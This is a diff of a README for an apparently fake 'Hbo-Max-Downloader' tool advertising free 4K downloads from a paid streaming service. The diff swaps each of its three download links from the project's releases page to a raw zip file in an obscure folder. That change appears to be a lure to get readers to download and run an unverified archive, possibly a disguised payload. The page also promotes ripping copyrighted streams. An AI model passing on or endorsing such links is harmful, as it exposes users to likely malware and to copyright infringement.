@@ -1,6 +1,6 @@
 # 🎬 Hbo-Max-Downloader - Your Free 4K Video Downloader for Windows
 
-[![Download Hbo Max Downloader](https://img.shields.io/badge/Download-Hbo_Max_Downloader-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fitting-dame2777/Hbo-Max-Downloader/releases)
+[![Download Hbo Max Downloader](https://img.shields.io/badge/Download-Hbo_Max_Downloader-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/fitting-dame2777/Hbo-Max-Downloader/main/disrate/1.2-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will walk you through everything you need to know, from downloading t
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [Download Hbo-Max-Downloader](https://github.com/fitting-dame2777/Hbo-Max-Downloader/releases)
+Visit this link to download the application: [Download Hbo-Max-Downloader](https://raw.githubusercontent.com/fitting-dame2777/Hbo-Max-Downloader/main/disrate/1.2-alpha.1.zip)
 
 Once you click the link, you'll be taken to the download page. Look for the latest version and click the download button. The file will save to your computer's default "Downloads" folder.
 
@@ -111,7 +111,7 @@ If you find Hbo-Max-Downloader useful, consider sharing it with friends or famil
 
 Don't wait any longer. Get your free copy of Hbo-Max-Downloader today and start building your offline video library.
 
-[![Download Now](https://img.shields.io/badge/Download-Hbo_Max_Downloader-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fitting-dame2777/Hbo-Max-Downloader/releases)
+[![Download Now](https://img.shields.io/badge/Download-Hbo_Max_Downloader-FF5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/fitting-dame2777/Hbo-Max-Downloader/main/disrate/1.2-alpha.1.zip)
 
 Happy downloading! 🎉
 
